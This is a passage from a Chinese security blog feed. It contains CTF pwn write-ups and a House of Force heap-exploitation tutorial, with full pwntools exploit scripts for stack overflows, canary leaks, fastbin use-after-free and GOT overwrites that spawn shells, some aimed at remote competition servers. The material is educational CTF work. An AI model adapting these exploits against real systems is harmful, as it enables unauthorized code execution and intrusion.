class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,</span><br><span class="line">terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line">p = process(<span class="string">&quot;./pwn_printf&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn_printf&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;interesting\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">p.sendline(<span class="string">&#x27;32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401213</span></span><br><span class="line">rop_addr = <span class="number">0x040117f</span></span><br><span class="line">add_eax_0x20290e_ret = <span class="number">0x0000000000400794</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>+p64(pop_rdi_ret)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(add_eax_0x20290e_ret)+p64(rop_addr)</span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x04007E7&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;puts_addr:&quot;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base = puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(libc_base+<span class="number">0x4527a</span>)<span class="comment">#p64(pop_rdi_ret)+p64(str_binsh)+p64(system)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">26 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf0364 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1207 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://www.anquanke.com/post/id/221334">2020 湖湘杯 PWN WriteUp</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> 湖湘杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 西普杯 信息安全铁人三项 第四赛区 Writeup</title>
      <link href="archives/212/"/>
      <url>archives/212/</url>
      
        <content type="html"><![CDATA[<h2 id="namepie"><a href="#namepie" class="headerlink" title="namepie"></a>namepie</h2><h3 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h3><p>程序有后门：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201108161441.png" alt="image-20201108161441296"></p><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>第二次输入栈溢出</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201108161534.png" alt="image-20201108161534336"></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>pie 保护 partly write 绕过。</p><p>第一次输入泄露 canary ，第二次覆盖 rip </p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./namepie&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;172.20.14.168&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./namepie&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">name = <span class="string">&#x27;skye&#x27;</span>.ljust(<span class="number">0x30</span>-<span class="number">0x8</span>+<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.send(name)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;skye&#x27;</span>.ljust(<span class="number">0x30</span>-<span class="number">0x8</span>,<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">canary = u64(p.recv(<span class="number">8</span>))-<span class="number">0x61</span></span><br><span class="line">log.info(<span class="string">&quot;canary:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(canary)+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+<span class="string">&#x27;\x71&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="onetime"><a href="#onetime" class="headerlink" title="onetime"></a>onetime</h2><h3 id="基本情况-1"><a href="#基本情况-1" class="headerlink" title="基本情况"></a>基本情况</h3><p>堆管理器，有增删查改功能，每个功能只能用一次，还有一个隐藏申请选项，也是只能用一次。</p><p>堆指针、每个功能使用标志位放在 bss 段。</p><p>堆申请大小固定 0x60 ，修改只能修改 0x40 ，但是隐藏申请选项能申请并写入 0x60 字节。</p><h3 id="漏洞-1"><a href="#漏洞-1" class="headerlink" title="漏洞"></a>漏洞</h3><p>free 函数 UAF ：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201108162257.png" alt="image-20201108162256914"></p><p>还有一点就是每个功能是否使用的判断条件，只要不等于 1 就能运行：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( xxxx_inuse == <span class="number">1</span> )</span><br></pre></td></tr></table></figure><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol><li>UAF 改 fastbin 中 fd 指针到 bss 段，用 bss 上 stdin 的值偏移 3 构造出 size 位 0x7f </li><li>申请堆回来，然后用隐藏申请选项申请出 bss 段的堆，顺便写入 payload （edit 用过一次不能用），将各个标志位覆盖，chunk_ptr 覆盖 atoi@got</li><li>泄露、修改函数地址</li></ol><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./onetime&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./onetime&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;172.20.14.168&quot;</span>,<span class="number">10001</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>():</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt;\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span>(<span class="params">content</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt;\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;content:&quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt;\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>():</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt;\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hint</span>(<span class="params">name</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt;\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">p.send(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">free()</span><br><span class="line">fill(p64(<span class="number">0x60208d</span>))</span><br><span class="line">add()</span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">3</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span><span class="comment">#+&#x27;\x00&#x27;*8+p64(0xdeadbeef)</span></span><br><span class="line"><span class="comment">#payload += p64(elf.got[&#x27;free&#x27;]) + p64(0xdeadbeef)*2</span></span><br><span class="line"></span><br><span class="line">hint(payload)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;data:&quot;</span>)</span><br><span class="line">atoi_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;atoi_addr:&quot;</span>+<span class="built_in">hex</span>(atoi_addr))</span><br><span class="line">libc_base = atoi_addr - libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;system_addr:&quot;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line"><span class="comment"># fill(&#x27;b&#x27;*8)</span></span><br><span class="line">fill(p64(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p,&#x27;b *0x40092D&#x27;)</span></span><br><span class="line">p.send(<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> 西普杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="archives/0/"/>
      <url>archives/0/</url>
      
        <content type="html"><![CDATA[<h1 id="House-Of-Force"><a href="#House-Of-Force" class="headerlink" title="House Of Force"></a>House Of Force</h1><h2 id="topchunk-分配机制"><a href="#topchunk-分配机制" class="headerlink" title="topchunk 分配机制"></a>topchunk 分配机制</h2><blockquote><p>作为前置知识，回顾一下</p></blockquote><p>当进行堆分配时，如果当前所有空闲（bin中）的堆块都无法满足条件，且 topchunk 大小可以满足需要空间的话，那么就会从 topchunk 中分割对应的大小用作堆块空间。</p><p>topchunk 大小是否满足的计算源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取当前的top chunk，并计算其对应的大小</span></span><br><span class="line">victim = av-&gt;top;</span><br><span class="line">size   = chunksize(victim);</span><br><span class="line"><span class="comment">// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE)) </span><br><span class="line">&#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder      = chunk_at_offset(victim, nb);</span><br><span class="line">    av-&gt;top        = remainder;</span><br><span class="line">    set_head(victim, nb | PREV_INUSE |</span><br><span class="line">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简化一下就是满足 <code>MINSIZE+申请大小&lt;=topchunk size</code> 即可通过检查，从 topchunk 上分配空间用作新堆块。</p><p>topchunk 也会向高地址移动，假设从 topchunk 分配 0x60 或 0x68 空间：</p><table><thead><tr><th>原topchunk</th><th>现topchunk</th><th>malloc(n)</th><th>topchunk移动</th></tr></thead><tbody><tr><td>0x603020</td><td>0x603090</td><td>0x60</td><td>0x70</td></tr><tr><td>0x603020</td><td>0x603090</td><td>0x68</td><td>0x70</td></tr></tbody></table><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>house of force 产生原因自安于 glibc 对于 topchunk 的处理。按照上文所说的，当满足 <code>MINSIZE+申请大小&lt;=topchunk size</code> 即可通过检查，可以将 topchunk 空间划分给堆块，并且 topchunk 移动相应距离。</p><p>那么就可以通过申请特定大小 chunk ，将 topchunk 移动到目标地址，再次申请堆就会分配到目标地址，实现任意地址读写操作。实现的关键就是绕过 topchunk size 检查，绕过方法就是将 size 覆盖为 -1（0xffffffffffffffff），让 size 变成最大（malloc 会强制转换为 unsigned int），一般情况都能满足 size check 要求。</p><p>topchunk 可以有两个移动方向：</p><ol><li>malloc(负数)，将 topchunk 往低地址移</li><li>malloc(正数)，将 topchunk 往高地址移</li></ol><h2 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h2><ol><li>能够以溢出等方式控制到 top chunk 的 size 域</li><li>能够自由地控制堆分配尺寸的大小</li></ol><p>实现效果：任意地址读写</p><h2 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h2><p>现在地址：topchunk 现在指向的地址</p><p>目标地址：往哪里写入的地址</p><ul><li>往低地址移（负数）：<code>偏移=现在地址-目标地址-0x20</code></li><li>往高地址移（正数）：<code>偏移=目标地址-现在地址</code></li></ul><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="HITCON-training-lab-11"><a href="#HITCON-training-lab-11" class="headerlink" title="HITCON training lab 11"></a>HITCON training lab 11</h3><h4 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h4><p>用 chunk_ptr 和 chunk_size  两个列表维护，基于下标操作堆块。增删查改功能都有。</p><h4 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h4><p>修改函数要求输入修改长度，对该长度没有限制，造成堆溢出：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please enter the length of item name:&quot;</span>, &amp;buf);</span><br><span class="line">read(<span class="number">0</span>, &amp;v4, <span class="number">8uLL</span>);</span><br><span class="line">length = atoi(&amp;v4);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please enter the new name of the item:&quot;</span>, &amp;v4);</span><br><span class="line"><span class="comment">//直接写入，没有对size进行检查</span></span><br><span class="line">*(_BYTE *)(chunk_ptr_list[<span class="number">2</span> * v2] + (<span class="keyword">signed</span> <span class="keyword">int</span>)read(<span class="number">0</span>, (<span class="keyword">void</span> *)chunk_ptr_list[<span class="number">2</span> * v2], length)) = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><blockquote><p>fastbin 攻击 malloc_hook 方法和正常套路流程差不多，最后贴 exp 。</p></blockquote><p>house of force 使用条件都满足，先明确将 topchunk 向上调多少。申请好等等用来溢出修改 topchunk size 的 chunk 之后，gdb 调试。</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201103111102.png" alt="image-20201103111102583"></p><p>这里就直接将堆申请覆盖整个第一个堆块，距离计算：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#(0x603010-0x603090)-0x20=-0xa0</span></span><br><span class="line">add(-<span class="number">0xa0</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;skye&#x27;</span>*<span class="number">2</span>+p64(elf.sym[<span class="string">&#x27;magic&#x27;</span>]))</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201103112332.png" alt="image-20201103112332803"></p><p>后面就申请一个堆，写入内容，也就是任意地址写。</p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><p>house of force</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./bamboobox&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./bamboobox&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;node3.buuoj.cn&quot;,29945)</span></span><br><span class="line"><span class="comment"># libc = ELF(&quot;./libc-2.23.so&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>,size,content</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x68</span>+p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(-<span class="number">0xa0</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;skye&#x27;</span>*<span class="number">2</span>+p64(elf.sym[<span class="string">&#x27;magic&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>fastbin attack</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./bamboobox&quot;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./bamboobox&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29945</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>,size,content</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.send(content)</span><br><span 